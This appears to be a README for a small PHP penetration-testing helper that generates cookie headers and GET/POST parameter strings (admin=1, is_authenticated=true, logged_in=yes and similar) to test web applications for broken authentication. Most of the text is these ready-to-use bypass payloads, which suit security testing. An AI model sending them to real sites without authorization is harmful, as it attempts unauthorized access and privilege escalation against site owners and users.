# magic_params
A simple helper for generating cookie header to test for broken authentication based on existence of predictably-named cookies.

Feel free to add some more words to the list, then run the tool, e.g.:

php generate_headers.php 

Cookie: auth=1; login=1; authenticated=1; admin=1; valid_user=1; valid-user=1; validuser=1; authenticated-user=1; authenticated_user=1; authenticateduser=1; valid=1; user=1; logged=1; loggedin=1; logged-in=1; logged_in=1; login=1; administrator=1; adminuser=1; admin-user=1; admin_user=1; is_valid=1; isvalid=1; is-valid=1; is_admin=1; isadmin=1; is-admin=1; isauthenticated=1; is-authenticated=1; is_authenticated=1; isuser=1; is_user=1; is-user=1

Cookie: auth=true; login=true; authenticated=true; admin=true; valid_user=true; valid-user=true; validuser=true; authenticated-user=true; authenticated_user=true; authenticateduser=true; valid=true; user=true; logged=true; loggedin=true; logged-in=true; logged_in=true; login=true; administrator=true; adminuser=true; admin-user=true; admin_user=true; is_valid=true; isvalid=true; is-valid=true; is_admin=true; isadmin=true; is-admin=true; isauthenticated=true; is-authenticated=true; is_authenticated=true; isuser=true; is_user=true; is-user=true

Cookie: auth=yes; login=yes; authenticated=yes; admin=yes; valid_user=yes; valid-user=yes; validuser=yes; authenticated-user=yes; authenticated_user=yes; authenticateduser=yes; valid=yes; user=yes; logged=yes; loggedin=yes; logged-in=yes; logged_in=yes; login=yes; administrator=yes; adminuser=yes; admin-user=yes; admin_user=yes; is_valid=yes; isvalid=yes; is-valid=yes; is_admin=yes; isadmin=yes; is-admin=yes; isauthenticated=yes; is-authenticated=yes; is_authenticated=yes; isuser=yes; is_user=yes; is-user=yes

GET/POST: auth=1&login=1&authenticated=1&admin=1&valid_user=1&valid-user=1&validuser=1&authenticated-user=1&authenticated_user=1&authenticateduser=1&valid=1&user=1&logged=1&loggedin=1&logged-in=1&logged_in=1&login=1&administrator=1&adminuser=1&admin-user=1&admin_user=1&is_valid=1&isvalid=1&is-valid=1&is_admin=1&isadmin=1&is-admin=1&isauthenticated=1&is-authenticated=1&is_authenticated=1&isuser=1&is_user=1&is-user=1

GET/POST: auth=true&login=true&authenticated=true&admin=true&valid_user=true&valid-user=true&validuser=true&authenticated-user=true&authenticated_user=true&authenticateduser=true&valid=true&user=true&logged=true&loggedin=true&logged-in=true&logged_in=true&login=true&administrator=true&adminuser=true&admin-user=true&admin_user=true&is_valid=true&isvalid=true&is-valid=true&is_admin=true&isadmin=true&is-admin=true&isauthenticated=true&is-authenticated=true&is_authenticated=true&isuser=true&is_user=true&is-user=true

GET/POST: auth=yes&login=yes&authenticated=yes&admin=yes&valid_user=yes&valid-user=yes&validuser=yes&authenticated-user=yes&authenticated_user=yes&authenticateduser=yes&valid=yes&user=yes&logged=yes&loggedin=yes&logged-in=yes&logged_in=yes&login=yes&administrator=yes&adminuser=yes&admin-user=yes&admin_user=yes&is_valid=yes&isvalid=yes&is-valid=yes&is_admin=yes&isadmin=yes&is-admin=yes&isauthenticated=yes&is-authenticated=yes&is_authenticated=yes&isuser=yes&is_user=yes&is-user=yes
